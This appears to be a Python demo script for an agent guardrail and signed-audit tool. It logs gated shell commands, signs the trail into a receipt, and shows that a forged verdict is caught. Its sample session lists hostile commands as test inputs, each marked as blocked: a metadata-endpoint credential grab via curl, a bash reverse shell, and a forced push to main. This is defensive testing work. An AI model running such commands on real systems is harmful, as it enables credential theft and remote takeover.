"""demo_attest.py -- the full receipt loop as one runnable story.

An agent session is gated and logged; `qedra-attest` signs the durable trail into one receipt; a relying
party verifies it with the public key alone; then the operator forges a verdict and the forgery is caught.

    python3 demo_attest.py
"""
from __future__ import annotations

import os
import tempfile

from qedra.audit_log import AuditLog
from qedra.control_plane import ControlPlane, Policy, Receipt, verify_receipt
from qedra.guardrail import Action, Guardrail


def main() -> int:
    d = tempfile.mkdtemp()
    log, key, receipt_path = f"{d}/session.jsonl", f"{d}/signing_key", f"{d}/receipt.json"

    # 1. A live agent session: each tool call is gated, and every gated call is streamed to a durable,
    #    hash-chained trail on disk (so a crashed agent still leaves a record).
    guard = Guardrail()
    cp = ControlPlane("demo-agent", Policy("qedra"), audit_log=AuditLog(log))
    session = [
        "cargo build --release",
        "git push --force origin main",                       # blocked: protected-branch rewrite
        "npm test",
        "curl http://169.254.169.254/latest/meta-data/iam/",  # blocked: IMDS credential theft
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",             # blocked: reverse shell
    ]
    print("== agent session (gated live) ==")
    for cmd in session:
        d0 = guard.check(Action("shell", cmd=cmd))
        cp.record(Action("shell", cmd=cmd), d0.verdict, d0.reason, executed=(d0.verdict == "ALLOW"))
        mark = "BLOCK" if d0.verdict == "BLOCK" else "ok   "
        print(f"  [{mark}] {cmd}")

    # 2. Attest: turn the durable trail into one signed, portable receipt (this is `qedra-attest`).
    from qedra.attest_cli import main as attest
    print("\n== qedra-attest -> signed receipt ==")
    attest([log, "--agent-id", "demo-agent", "--key", key, "--out", receipt_path, "-q"])
    pub = Receipt.from_json(open(receipt_path).read()).public_key
    print(f"  signed {receipt_path}; public key {pub[:16]}...")

    # 3. A relying party (auditor / insurer / platform) verifies with the public key alone -- no trust in us.
    receipt = Receipt.from_json(open(receipt_path).read())
    v = verify_receipt(receipt, Policy("qedra"))
    print(f"\n== relying party verifies ==\n  {'VERIFIED' if v.ok else 'REJECTED'}: {v.reason}")

    # 4. The operator forges the trace: flip the blocked force-push to 'ALLOW, executed'. The policy re-run
    #    inside verification catches it even though the operator could re-chain and re-sign.
    forged = Receipt.from_json(receipt.to_json())
    for e in forged.entries:
        if "force" in (e.action or {}).get("cmd", ""):
            e.verdict, e.executed = "ALLOW", True
    vf = verify_receipt(forged, Policy("qedra"))
    print(f"\n== operator forges 'the force-push was allowed' ==\n  {'VERIFIED' if vf.ok else 'REJECTED'}: {vf.reason}")

    ok = v.ok and not vf.ok
    print(f"\n{'PASS' if ok else 'FAIL'}: an honest receipt verifies; a forged one is caught by anyone holding only the public key.")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
